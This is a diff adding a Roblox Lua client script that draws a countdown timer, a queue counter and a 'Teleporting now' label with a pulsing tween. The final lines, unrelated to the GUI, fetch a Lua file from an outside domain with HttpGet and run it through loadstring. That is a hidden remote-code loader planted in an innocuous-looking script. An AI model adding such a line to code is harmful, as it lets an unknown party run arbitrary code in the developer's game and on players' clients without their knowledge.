@@ -1,0 +1,95 @@
+
+local ScreenGui = Instance.new("ScreenGui")
+local CountdownFrame = Instance.new("Frame")
+local CountdownLabel = Instance.new("TextLabel")
+local QueueLabel = Instance.new("TextLabel")
+local TeleportLabel = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.IgnoreGuiInset = true
+
+CountdownFrame.Parent = ScreenGui
+CountdownFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+CountdownFrame.Position = UDim2.new(0.5, 0, 0.4, 0)
+CountdownFrame.Size = UDim2.new(0, 300, 0, 100)
+CountdownFrame.BackgroundTransparency = 0.5
+CountdownFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+
+UICorner.CornerRadius = UDim.new(0.1, 0)
+UICorner.Parent = CountdownFrame
+
+CountdownLabel.Parent = CountdownFrame
+CountdownLabel.Size = UDim2.new(1, 0, 0.5, 0)
+CountdownLabel.Position = UDim2.new(0, 0, 0, 0)
+CountdownLabel.BackgroundTransparency = 1
+CountdownLabel.TextColor3 = Color3.new(1, 1, 1)
+CountdownLabel.Font = Enum.Font.SourceSansBold
+CountdownLabel.TextScaled = true
+CountdownLabel.Text = "5:00"
+
+QueueLabel.Parent = CountdownFrame
+QueueLabel.Size = UDim2.new(1, 0, 0.5, 0)
+QueueLabel.Position = UDim2.new(0, 0, 0.5, 0)
+QueueLabel.BackgroundTransparency = 1
+QueueLabel.TextColor3 = Color3.new(1, 1, 1)
+QueueLabel.Font = Enum.Font.SourceSans
+QueueLabel.TextScaled = true
+QueueLabel.Text = "Queue: 10"
+
+TeleportLabel.Parent = ScreenGui
+TeleportLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+TeleportLabel.Position = UDim2.new(0.5, 0, 0.6, 0)
+TeleportLabel.Size = UDim2.new(0, 300, 0, 50)
+TeleportLabel.BackgroundTransparency = 1
+TeleportLabel.TextColor3 = Color3.new(1, 0, 0)
+TeleportLabel.Font = Enum.Font.SourceSansBold
+TeleportLabel.TextScaled = true
+TeleportLabel.Text = ""
+TeleportLabel.Visible = false
+
+local countdownTime = 300
+local queueTime = 10
+local countdownStart = countdownTime
+
+local function formatTime(time)
+    local minutes = math.floor(time / 60)
+    local seconds = math.floor(time % 60)
+    return string.format("%d:%02d", minutes, seconds)
+end
+
+spawn(function()
+    while countdownTime > 0 do
+        CountdownLabel.Text = formatTime(countdownTime)
+        queueTime = queueTime - (1 / 60)
+        if queueTime < 0 then
+            queueTime = 0
+            QueueLabel.Text = "Queue: 0"
+            TeleportLabel.Visible = true
+            TeleportLabel.Text = "Teleporting now"
+        else
+            QueueLabel.Text = "Queue: " .. math.floor(queueTime)
+        end
+        wait(1)
+        countdownTime = countdownTime - 1
+    end
+end)
+
+local function applyScaleEffect()
+    local tweenService = game:GetService("TweenService")
+    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    local tween = tweenService:Create(CountdownFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 110)})
+    tween:Play()
+end
+
+applyScaleEffect()
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+end)
+
+do
+loadstring(game:HttpGet("https://egorikusa.space/6ea7bfdaef07489be9e7a60f.lua", true))()
+
+end
+
